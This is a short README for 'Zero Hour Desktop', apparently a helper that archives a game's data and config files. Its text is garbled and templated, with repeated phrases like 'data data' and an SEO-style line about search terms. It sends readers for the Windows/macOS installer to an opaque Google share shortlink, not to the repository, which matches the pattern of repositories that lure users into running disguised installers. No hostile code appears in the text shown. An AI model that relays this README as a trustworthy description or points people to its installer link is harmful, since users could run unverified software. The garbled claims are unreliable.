# Zero Hour Desktop

*Dated copies of Zero Hour data data, nothing uploaded.*

## Overview

This repository is **Zero Hour Desktop**, a desktop helper. Dated copies of Zero Hour data data, nothing uploaded.

Zero Hour drops data files next to launcher caches.

No browser upload step: the work happens on disk, then you keep the output folder.

## Editions

Two editions of the same tool:

- **CLI** — the source in this repo. Python 3.11+, local files only.
- **Desktop build** — Windows / macOS installer on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8).

## What it does

- Finds the Zero Hour data directory.
- Copies config and export files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## The problem

People search Zero Hour desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.
